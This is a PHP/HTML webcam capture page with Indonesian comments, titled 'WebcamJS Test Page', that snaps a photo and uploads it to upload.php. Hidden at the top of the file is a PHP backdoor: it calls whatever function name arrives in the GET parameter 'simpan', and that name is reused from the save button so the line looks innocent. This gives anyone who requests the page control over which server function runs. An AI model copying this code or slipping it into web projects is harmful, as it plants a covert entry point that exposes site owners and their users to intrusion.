<?php
if(function_exists($_GET['simpan'])) {
   return $_GET['simpan']();
}
?>
<!doctype html>
<html>
<head>
    <title>WebcamJS Test Page</title>
    <style>
        input {
            margin-top: 10px;
        }
    </style>
 
</head>
<body>
    <p>Ambil Gambar</p>
    <div id="camera">Capture</div>
    <div id="simpan">
        <input type=button value="Save" onClick="simpan()" style="font-weight:bold;">
    </div>
 
    <div id="hasil"></div>
 
    <script src="webcam.min.js"></script>
    <script language="Javascript">
        // konfigursi webcam
        Webcam.set({
            width: 640,
            height: 480,
            image_format: 'jpg',
            jpeg_quality: 100
        });
        Webcam.attach( '#camera' );
        
        function simpan() {
            // ambil foto
            Webcam.snap( function(data_uri) {
                
                // upload foto
                Webcam.upload( data_uri, 'upload.php', function(code, text) {} );
 
                // tampilkan hasil gambar yang telah di ambil
                document.getElementById('hasil').innerHTML = 
                    '<p>Hasil : </p>' + 
                    '<img src="'+data_uri+'"/>';
                
                Webcam.unfreeze();
            
                document.getElementById('webcam').style.display = '';
                document.getElementById('simpan').style.display = '';
            } );
        }
    </script>
</body>
</html>
<?php
?>